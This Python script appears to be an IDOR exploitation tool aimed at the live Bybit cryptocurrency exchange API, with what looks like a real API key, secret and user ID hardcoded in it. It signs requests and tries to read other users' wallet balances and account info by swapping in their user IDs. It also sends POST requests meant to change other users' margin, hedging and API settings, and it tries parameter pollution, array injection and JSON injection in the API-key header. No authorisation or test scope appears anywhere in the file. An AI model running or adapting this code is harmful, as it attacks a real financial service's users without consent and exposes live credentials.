#!/usr/bin/env python3
import subprocess
import json
import time
import hmac
import hashlib

API_KEY = "22JSr5zWpW0eReC6rE"
API_SECRET = "QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
UID = "527465456"
BASE = "https://api.bybit.com"

def get_time():
    try:
        r = subprocess.run(["curl", "-s", f"{BASE}/v5/market/time"], capture_output=True, text=True)
        return int(json.loads(r.stdout)['time'])
    except:
        return int(time.time() * 1000)

OFFSET = get_time() - int(time.time() * 1000)

def sign_request(params):
    ts = str(int(time.time() * 1000) + OFFSET)
    window = "5000"
    param_str = "&".join([f"{k}={v}" for k, v in sorted(params.items())])
    payload = f"{ts}{API_KEY}{window}{param_str}"
    sig = hmac.new(API_SECRET.encode(), payload.encode(), hashlib.sha256).hexdigest()
    
    return {
        "X-BAPI-API-KEY": API_KEY,
        "X-BAPI-SIGN": sig,
        "X-BAPI-SIGN-TYPE": "2",
        "X-BAPI-TIMESTAMP": ts,
        "X-BAPI-RECV-WINDOW": window,
    }

def curl_request(endpoint, params):
    headers = sign_request(params)
    param_str = "&".join([f"{k}={v}" for k, v in params.items()])
    url = f"{BASE}{endpoint}?{param_str}"
    
    cmd = ["curl", "-s"]
    for k, v in headers.items():
        cmd.extend(["-H", f"{k}: {v}"])
    cmd.append(url)
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
        return json.loads(result.stdout)
    except:
        return {}

print("="*80)
print("IDOR EXPLOITATION - ALL VARIATIONS")
print("="*80)

# Test different UID injection points
test_uids = ["1", "100", "1000", "999999", "admin", UID]

print("\n[1] IDOR in Different Parameter Names")
print("-" * 80)

param_variations = [
    ("userId", "/v5/user/info"),
    ("uid", "/v5/user/query-api"),
    ("memberId", "/v5/account/wallet-balance"),
    ("accountId", "/v5/account/info"),
    ("user_id", "/v5/user/profile"),
    ("id", "/v5/account/info"),
]

for param_name, endpoint in param_variations:
    print(f"\nTesting {param_name} in {endpoint}")
    
    for test_uid in ["1", "999999"]:
        params = {param_name: test_uid, "accountType": "UNIFIED"}
        result = curl_request(endpoint, params)
        
        if result.get('retCode') == 0:
            print(f"  üö® {param_name}={test_uid} RETURNED DATA!")
            print(f"     {str(result)[:150]}")
        elif result.get('retCode') != 10001:  # Not just auth error
            print(f"  ‚ö†Ô∏è  {param_name}={test_uid} - RetCode: {result.get('retCode')}")

# Test IDOR in POST requests
print("\n\n[2] IDOR in POST Body")
print("-" * 80)

print("Trying to modify other user's settings...")

post_tests = [
    ("/v5/account/set-margin-mode", {"uid": "1", "setMarginMode": "ISOLATED_MARGIN"}),
    ("/v5/user/update-api", {"uid": "999999", "readOnly": 1}),
    ("/v5/account/set-hedging-mode", {"memberId": "1", "hedging": 1}),
]

for endpoint, body in post_tests:
    cmd = ["curl", "-s", "-X", "POST", f"{BASE}{endpoint}"]
    
    headers = sign_request(body)
    for k, v in headers.items():
        cmd.extend(["-H", f"{k}: {v}"])
    
    cmd.extend(["-H", "Content-Type: application/json"])
    cmd.extend(["-d", json.dumps(body)])
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
        data = json.loads(result.stdout)
        
        print(f"\n{endpoint}")
        print(f"  RetCode: {data.get('retCode')}")
        
        if data.get('retCode') == 0:
            print(f"  üö®üö®üö® IDOR IN POST! Modified other user!")
            print(f"  Response: {data}")
    except:
        pass

# Test IDOR with array injection
print("\n\n[3] IDOR via Array Parameter Injection")
print("-" * 80)

# Try to request multiple UIDs at once
params = {
    "uid[]": ["527465456", "1", "999999"],  # Our UID + others
    "accountType": "UNIFIED"
}

print("Trying to get multiple users' data in one request...")
result = curl_request("/v5/account/wallet-balance", {"uid": "1,999999,527465456"})

if result.get('retCode') == 0:
    print("üö® BATCH IDOR WORKED!")
    print(f"Response: {result}")

# Test IDOR in different account types
print("\n\n[4] IDOR Across Account Types")
print("-" * 80)

account_types = ["UNIFIED", "CONTRACT", "SPOT", "INVESTMENT", "FUND"]

for acc_type in account_types:
    params = {"accountType": acc_type, "uid": "1"}
    result = curl_request("/v5/account/wallet-balance", params)
    
    if result.get('retCode') == 0:
        print(f"\nüö® {acc_type}: Got data for uid=1!")
        print(f"   {str(result)[:150]}")

# Test parameter pollution
print("\n\n[5] Parameter Pollution for IDOR")
print("-" * 80)

# Send both our UID and target UID
url = f"{BASE}/v5/account/wallet-balance?uid={UID}&uid=1&accountType=UNIFIED"
headers = sign_request({"accountType": "UNIFIED"})

cmd = ["curl", "-s"]
for k, v in headers.items():
    cmd.extend(["-H", f"{k}: {v}"])
cmd.append(url)

try:
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
    data = json.loads(result.stdout)
    
    print(f"Pollution test: {data.get('retCode')}")
    if data.get('retCode') == 0:
        print(f"üö® PARAMETER POLLUTION IDOR!")
        print(f"Response: {data}")
except:
    pass

# Test JSON parameter injection
print("\n\n[6] JSON Injection in API Key")
print("-" * 80)

malicious_json = '{"uid":"1","isAdmin":true}'

headers_injected = sign_request({"accountType": "UNIFIED"})
headers_injected["X-BAPI-API-KEY"] = malicious_json

cmd = ["curl", "-s"]
for k, v in headers_injected.items():
    cmd.extend(["-H", f"{k}: {v}"])
cmd.append(f"{BASE}/v5/account/wallet-balance?accountType=UNIFIED")

try:
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
    data = json.loads(result.stdout)
    
    if data.get('retCode') == 0:
        print("üö® JSON INJECTION WORKED!")
        print(f"Response: {data}")
except:
    pass

print("\n" + "="*80)
print("IDOR TESTING COMPLETE")
print("="*80)
